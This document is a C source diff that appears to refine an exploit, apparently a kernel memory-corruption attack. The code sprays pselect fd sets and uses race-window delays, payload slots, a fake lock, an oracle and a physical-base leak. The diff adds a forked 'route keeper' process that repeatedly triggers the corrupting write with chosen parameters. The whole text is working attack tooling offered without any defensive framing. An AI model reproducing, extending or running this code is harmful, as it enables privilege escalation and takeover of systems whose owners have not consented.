@@ -1,4 +1,5 @@
 #include "common.h"
+#include <poll.h>
 
 #ifndef SLIDE_MAX_ATTEMPTS
 #define SLIDE_MAX_ATTEMPTS 20
@@ -6,6 +7,9 @@
 #define SLIDE_PSELECT_PAD_BYTES 0
 #ifndef SLIDE_PSELECT_WORD_SHIFT
 #define SLIDE_PSELECT_WORD_SHIFT 0
+#endif
+#ifndef SLIDE_PSELECT_MAX_OPEN_FD
+#define SLIDE_PSELECT_MAX_OPEN_FD 254
 #endif
 #define SLIDE_WAIT_NSEC 50000000L
 #define SLIDE_REQUEUE_MAX_POLLS 1000
@@ -233,7 +237,8 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 }
 
 void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
-  for (int fd = 0; fd < slide_pselect_nfds; fd++) {
+  for (int fd = 0; fd < slide_pselect_nfds && fd <= SLIDE_PSELECT_MAX_OPEN_FD;
+       fd++) {
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
       dup2(read_fd, fd);
     }
@@ -255,7 +260,7 @@ void slide_pselect_stack_copy(void) {
                errno);
     block_fd = pipefd[0];
   }
-  int high_read = fcntl(block_fd, F_DUPFD, slide_pselect_nfds + 16);
+  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_MAX_OPEN_FD - 16);
   if (high_read < 0) {
     pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
     if (block_fd != pipefd[0]) {
@@ -623,7 +628,132 @@ static int slide_child_trigger_write(void) {
          atomic_load(&slide_pselect_write_window) != 0;
 }
 
-static int slide_trigger_physical_state(void) {
+struct slide_route_request {
+  size_t slot;
+  int delay_usec;
+  int nfds;
+  int pad;
+  uintptr_t page_base;
+};
+
+static int slide_route_req_read = -1;
+static int slide_route_res_write = -1;
+static int slide_route_req_write = -1;
+static int slide_route_res_read = -1;
+static pid_t slide_route_keeper_pid = -1;
+
+static void slide_route_keeper_loop(void) {
+  syscall(SYS_prctl, PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
+  syscall(SYS_prctl, PR_SET_NAME, "slide-route-kpr", 0, 0, 0);
+  for (;;) {
+    struct slide_route_request req;
+    ssize_t got = read(slide_route_req_read, &req, sizeof(req));
+    if (got != (ssize_t)sizeof(req)) {
+      break;
+    }
+    char delay_arg[16];
+    snprintf(delay_arg, sizeof(delay_arg), "%d", req.delay_usec);
+    setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1);
+    page_base = req.page_base;
+    pid_t child = SYSCHK(fork());
+    if (child == 0) {
+      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+      if (getppid() == 1) {
+        _exit(1);
+      }
+      disable_rseq_for_thread();
+      slide_log_child_context();
+      slide_pselect_nfds = req.nfds;
+      slide_syscall_pad = req.pad;
+      if (!select_slide_payload_index(req.slot)) {
+        _exit(1);
+      }
+      _exit(slide_child_trigger_write() ? 0 : 1);
+    }
+    int status = 0;
+    SYSCHK(waitpid(child, &status, 0));
+    int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
+    pr_info("slide route keeper child=%d slot=%zu status=%d ok=%d\n",
+            child, req.slot, status, ok);
+    ssize_t wrote = write(slide_route_res_write, &ok, sizeof(ok));
+    if (wrote != (ssize_t)sizeof(ok)) {
+      break;
+    }
+  }
+  _exit(0);
+}
+
+int slide_route_keeper_start(void) {
+  if (slide_route_keeper_pid > 0) {
+    return 1;
+  }
+  int req_pipe[2] = {-1, -1};
+  int res_pipe[2] = {-1, -1};
+  if (pipe(req_pipe) != 0 || pipe(res_pipe) != 0) {
+    pr_error("slide route keeper pipes failed errno=%d\n", errno);
+    return 0;
+  }
+  pid_t pid = fork();
+  if (pid < 0) {
+    pr_error("slide route keeper fork failed errno=%d\n", errno);
+    close(req_pipe[0]);
+    close(req_pipe[1]);
+    close(res_pipe[0]);
+    close(res_pipe[1]);
+    return 0;
+  }
+  if (pid == 0) {
+    close(req_pipe[1]);
+    close(res_pipe[0]);
+    slide_route_req_read = req_pipe[0];
+    slide_route_res_write = res_pipe[1];
+    slide_route_keeper_loop();
+  }
+  close(req_pipe[0]);
+  close(res_pipe[1]);
+  slide_route_req_write = req_pipe[1];
+  slide_route_res_read = res_pipe[0];
+  slide_route_keeper_pid = pid;
+  pr_success("slide route keeper pid=%d small-fdtable route ready\n", pid);
+  return 1;
+}
+
+static int slide_route_trigger_keeper(size_t slot, int nfds, int pad) {
+  int delay = (int)slide_enter_delay_usec();
+  struct slide_route_request req = {
+    .slot = slot,
+    .delay_usec = delay,
+    .nfds = nfds,
+    .pad = pad,
+    .page_base = page_base,
+  };
+  ssize_t wrote = write(slide_route_req_write, &req, sizeof(req));
+  if (wrote != (ssize_t)sizeof(req)) {
+    pr_error("slide route keeper request write failed errno=%d\n", errno);
+    return 0;
+  }
+  struct pollfd pfd = {.fd = slide_route_res_read, .events = POLLIN};
+  int polled = poll(&pfd, 1, 120000);
+  if (polled <= 0) {
+    pr_error("slide route keeper response timeout polled=%d errno=%d\n",
+             polled, errno);
+    return 0;
+  }
+  int ok = 0;
+  ssize_t got = read(slide_route_res_read, &ok, sizeof(ok));
+  if (got != (ssize_t)sizeof(ok)) {
+    pr_error("slide route keeper response read failed errno=%d\n", errno);
+    return 0;
+  }
+  pr_info("slide route keeper slot=%zu delay=%d nfds=%d pad=%d ok=%d\n",
+          slot, delay, nfds, pad, ok);
+  return ok;
+}
+
+static int slide_trigger_physical_state(size_t slot, int nfds, int pad) {
+  if (slide_route_keeper_pid > 0) {
+    return slide_route_trigger_keeper(slot, nfds, pad);
+  }
   pid_t child = SYSCHK(fork());
   if (child == 0) {
     SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
@@ -632,6 +762,11 @@ static int slide_trigger_physical_state(void) {
     }
     disable_rseq_for_thread();
     slide_log_child_context();
+    slide_pselect_nfds = nfds;
+    slide_syscall_pad = pad;
+    if (!select_slide_payload_index(slot)) {
+      _exit(1);
+    }
     _exit(slide_child_trigger_write() ? 0 : 1);
   }
   int status = 0;
@@ -645,16 +780,13 @@ static int slide_trigger_physical_slot(size_t slot) {
   if (!select_slide_payload_index(slot)) {
     return 0;
   }
-  char delay_arg[16];
   int delay = (int)slide_enter_delay_usec();
-  slide_pselect_nfds = PSELECT_ROUTE_NFDS;
-  slide_syscall_pad = 0;
+  char delay_arg[16];
   snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
   SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
-  if (slide_trigger_physical_state()) {
-    pr_info("p0 physical slot=%zu write attempt=1/1 delay=%d nfds=%d "
-            "pad=%d\n",
-            slot, delay, slide_pselect_nfds, slide_syscall_pad);
+  if (slide_trigger_physical_state(slot, PSELECT_ROUTE_NFDS, 0)) {
+    pr_info("p0 physical slot=%zu write attempt=1/1 delay=%d nfds=%d pad=%d\n",
+            slot, delay, PSELECT_ROUTE_NFDS, 0);
     return 1;
   }
   pr_error("p0 physical slot=%zu write window failed after one attempt\n",
@@ -691,7 +823,7 @@ int app_trigger_fops_slide_route(void) {
   pr_info("app fops slide route parent=%016zx target=%016zx lock=%016zx "
           "delay=%d\n",
           slide_oracle_parent, slide_oracle_target, fake_lock, delay);
-  return slide_trigger_physical_state();
+  return slide_trigger_physical_state(0, PSELECT_ROUTE_NFDS, 0);
 }
 
 static int slide_leak_physical_base(void) {
@@ -871,7 +1003,7 @@ int run_p0_pipe_oracle_diagnostic(int fd) {
           slide_oracle_target, (unsigned long long)original_target);
   dump_p0_oracle_words(fd, "target-before", target_start, 20);
   dump_p0_oracle_words(fd, "parent-before", parent_start, 8);
-  if (!slide_trigger_physical_state()) {
+  if (!slide_trigger_physical_state(0, PSELECT_ROUTE_NFDS, 0)) {
     pr_error("p0 diagnostic gate trigger failed\n");
     return 0;
   }
